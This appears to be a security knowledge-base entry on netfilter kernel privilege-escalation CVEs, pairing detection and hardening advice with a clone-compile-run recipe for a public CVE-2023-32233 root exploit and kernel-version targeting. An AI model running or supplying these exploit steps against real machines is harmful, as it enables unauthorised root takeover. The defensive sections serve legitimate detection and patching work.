name: Netfilter - Kernel LPE CVEs
description: Several netfilter (nf_tables) bugs give local root on a range of kernels. Match the kernel version to the right CVE, then clone/compile/run.

variations.label: CVE-2023-32233 (up to 6.3.1)
variations.command:
git clone https://github.com/Liuk3r/CVE-2023-32233 && cd CVE-2023-32233
gcc -Wall -o exploit exploit.c -lmnl -lnftnl
./exploit

defense.why_it_works: The Linux netfilter subsystem (iptables/nftables) contains kernel-level vulnerabilities. CVE-2021-22555, CVE-2022-25636, and CVE-2023-32233 exploit memory corruption flaws in packet processing (heap overflow, use-after-free) to achieve kernel code execution and local privilege escalation to root.
defense.prerequisites: Local user account. Vulnerable kernel version (CVE-2021-22555: 2.6-5.11, CVE-2022-25636: 5.4-5.6.10, CVE-2023-32233: up to 6.3.1). Ability to compile or execute exploit code. CAP_NET_ADMIN may be required for some variants.
defense.impact: Root privilege escalation via kernel code execution. All user-space security controls (sudo, capabilities, AppArmor, SELinux) are bypassed since the exploit operates in kernel space.
defense.detection: Compilation of netfilter exploit code (gcc with kernel exploit source). Unusual nftables/iptables rule manipulation followed by process privilege change. EDR: uid escalation 1000->0 outside normal paths. Kernel oops in /var/log/kern.log on failed exploits.
defense.artifacts: Process audit log (exploit compilation/execution) | EDR: uid change 1000->0 | Kernel log: potential oops on failed attempt
defense.prevention: Apply kernel security updates immediately. Enable automatic kernel patching. Restrict CAP_NET_ADMIN capability to necessary system processes only. Deploy kernel hardening (SMEP, SMAP, struct_randomize). Use user namespaces restrictions (sysctl kernel.unprivileged_userns_clone=0 where feasible).
defense.misconfiguration: System running a kernel in the affected version range without the security patch. CAP_NET_ADMIN accessible to unprivileged users via user namespaces. Automatic kernel updates disabled.
defense.vulnerable_config:
# Vulnerable kernel examples:
# CVE-2021-22555: 5.10.0-xx < 5.11 patch
# CVE-2022-25636: 5.4.x-5.6.10
# CVE-2023-32233: < 6.3.2
uname -r

# Unprivileged user namespaces enabled (required for some variants)
cat /proc/sys/kernel/unprivileged_userns_clone  # if 1, exploitable
defense.secure_config:
# Update kernel
apt update && apt upgrade linux-image-generic

# Disable unprivileged user namespaces (if not needed)
echo 'kernel.unprivileged_userns_clone=0' >> /etc/sysctl.conf
sysctl -p

# Enable automatic security updates
apt install unattended-upgrades
